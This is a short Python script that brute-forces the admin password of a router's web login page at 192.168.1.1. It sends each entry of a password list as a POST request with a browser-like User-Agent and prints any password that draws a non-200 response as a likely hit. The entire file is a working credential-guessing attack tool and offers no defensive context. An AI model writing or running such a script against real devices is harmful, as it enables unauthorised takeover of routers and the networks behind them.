import requests
import colorama
from colorama import Fore,Style
def exec(passlist):
    url = "http://192.168.1.1:80/login/login-page.cgi"
    headers = {"Origin": "http://192.168.1.1","Connection": "close","User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36"}
    possible_list = []
    for line in passlist:
        pass_ = line.strip("\n")
        data = {"AuthName": "admin", "AuthPassword": pass_}
        req = requests.post(url,headers=headers,data=data,allow_redirects=False)
        print(Fore.YELLOW + "[*] Trying",pass_, req.status_code)
        if not req.status_code == 200:
            print(Fore.RED + "[Possibly] " , pass_)
            possible_list.append("[+] " + pass_)    
    print("\nPossible Passwords")
    print(Fore.GREEN , *possible_list,sep="\n")
